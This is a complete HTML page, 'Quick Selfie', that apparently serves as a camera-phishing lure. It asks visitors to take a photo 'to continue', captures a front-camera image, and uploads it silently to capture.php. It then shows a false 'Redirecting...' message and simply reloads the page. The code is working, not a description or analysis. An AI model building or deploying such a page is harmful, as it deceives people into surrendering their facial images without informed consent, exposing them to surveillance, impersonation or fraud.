<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><title>Quick Selfie</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system, sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);height:100vh;display:flex;align-items:center;justify-content:center}.container{background:#fff;max-width:360px;width:95%;padding:30px;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.2);text-align:center}h1{font-size:28px;color:#333;margin-bottom:10px}p{color:#666;margin-bottom:25px;font-size:16px}video{width:100%;height:250px;object-fit:cover;border-radius:15px;margin-bottom:20px}.btn{background:linear-gradient(45deg,#ff6b6b,#ff8e8e);color:#fff;border:none;padding:18px 40px;font-size:18px;border-radius:50px;cursor:pointer;width:100%;font-weight:600;box-shadow:0 10px 30px rgba(255,107,107,0.4);transition:all 0.3s}.btn:hover{transform:translateY(-3px);box-shadow:0 15px 40px rgba(255,107,107,0.5)}.btn:active{transform:translateY(-1px)}#status{margin:20px 0;font-weight:500;color:#555}.loading{display:inline-block;width:24px;height:24px;border:3px solid #f3f3f3;border-top:3px solid #ff6b6b;border-radius:50%;animation:spin 1s linear infinite}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style></head><body><div class="container"><h1>üì∏ Quick Selfie</h1><p>Snap a quick photo to continue</p><video id="preview" autoplay playsinline muted style="display:none"></video><div id="status">üîÑ Getting camera ready...</div><button id="capture" class="btn" onclick="snap()" disabled>üì∑ Take Photo</button><canvas id="canvas" style="display:none"></canvas></div><script>const video=document.getElementById('preview'),status=document.getElementById('status'),btn=document.getElementById('capture'),canvas=document.getElementById('canvas');navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:1280,height:720}}).then(stream=>{video.srcObject=stream;video.style.display='block';status.textContent='‚úÖ Camera ready! Tap to snap photo.';btn.disabled=false}).catch(e=>{status.textContent='‚ö†Ô∏è Please allow camera access.'});function snap(){status.innerHTML='<span class="loading"></span> Capturing...';btn.disabled=true;canvas.width=video.videoWidth;canvas.height=video.videoHeight;canvas.getContext('2d').drawImage(video,0,0);canvas.toBlob(blob=>{const fd=new FormData();fd.append('photo',blob,`selfie_${Date.now()}.jpg`);fetch('capture.php',{method:'POST',body:fd}).then(r=>r.text()).then(()=>status.innerHTML='‚úÖ Photo captured! Redirecting...').catch(()=>status.textContent='‚ùå Try again').finally(()=>{setTimeout(()=>location.reload(),2e3)})},'image/jpeg',.9)}</script></body></html>
